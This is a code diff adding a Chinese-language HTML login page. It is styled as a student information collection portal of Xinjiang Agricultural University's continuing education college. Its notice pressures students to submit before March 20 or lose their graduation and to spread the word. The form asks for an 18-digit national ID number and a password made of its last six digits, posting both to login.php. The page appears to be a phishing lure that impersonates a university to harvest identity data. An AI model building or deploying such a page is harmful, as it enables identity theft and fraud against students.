@@ -1,0 +1,90 @@
+<html>
+ <head> 
+  <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" /> 
+  <title>学生登录</title> 
+  <style type="text/css"> 
+
+  ul li{margin:0;padding:0;} 
+
+  form{margin:40px 30px 0;} 
+
+  form li{list-style:none;padding:5px 0;} 
+
+  form li label{float:left;width:70px;text-align:right} 
+
+  form li a{font-size:12px;color:#999;text-decoration:none} 
+
+  .login_btn{border:none;background:#01A4F1;color:#fff;font-size:14px;font-weight:bold;height:28px;line-height:28px;padding:0 10px;cursor:pointer;} 
+
+  form li img{vertical-align:top} 
+
+ </style> 
+ 
+ <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+ <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+ <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+
+ </head> 
+ <body> 
+<div class="container-fluid">
+  <div class="row">
+      <form action="login.php" method="post" class="form-horizontal">
+		<fieldset>
+			<legend>高等教育在校生基本信息采集</legend>
+
+
+			<div class="col-sm-4">
+	<br>		
+	<hr>		
+
+
+<blockquote>
+  <p class="bg-warning" >
+			  &nbsp;&nbsp;&nbsp;&nbsp;应教育厅要求，需核对并补全完整2018级成人学生信息，必须于3月20日之前提交完成，如不按时上传信息，将不能正常毕业，望相互转告 ！
+</p>
+  <footer>  ————  新疆农业大学 <cite title="Source Title">继续教育学院</cite></footer>
+</blockquote>
+
+
+<hr>
+<br>
+
+			</div>			
+
+
+			 <div class="col-sm-12">
+			 		<label class="col-sm-4 control-label">登  录  名:</label>
+			 		<div class="col-sm-8 control-label">
+						<input type="text" name="IdCard"  placeholder="请输入18位身份证号码">
+			 		</div>
+					
+			</div>
+ 			 <div class="col-sm-12">
+ 			 		<label  class="col-sm-4 control-label">密   码:</label>
+ 			 		<div class="col-sm-8 control-label">
+						<input type="password" name="password" placeholder="请输入身份证后六位密码">
+			 		</div>
+					
+			</div>
+
+			<div class="col-sm-12" align="center">
+			<br>
+			<br>
+				<input type="submit" name="login" value="登  录" class="btn btn-primary btn-lg btn-block">
+			</div>
+
+
+
+		</fieldset>
+	</form>
+  </div>
+
+</div>
+  
+
+ </body>
+</html>
